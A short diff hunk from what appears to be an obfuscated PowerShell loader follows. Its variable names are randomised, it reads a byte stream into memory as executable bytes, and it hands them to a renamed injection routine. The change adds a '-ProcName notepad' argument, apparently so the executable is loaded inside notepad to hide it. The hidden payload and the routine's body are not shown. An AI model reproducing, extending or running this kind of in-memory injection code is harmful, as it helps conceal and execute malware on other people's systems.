@@ -2956,6 +2956,6 @@ $zatsg = New-Object System.IO.MemOryStream
 $tqzatr.CopyTo( $zatsg )
 [byte[]] $iauszshj = $zatsg.ToArray()
 
-Invoke-somethingElse -PEBytes $iauszshj -ExeArgs ""
+Invoke-somethingElse -PEBytes $iauszshj -ExeArgs "" -ProcName notepad
 
 }
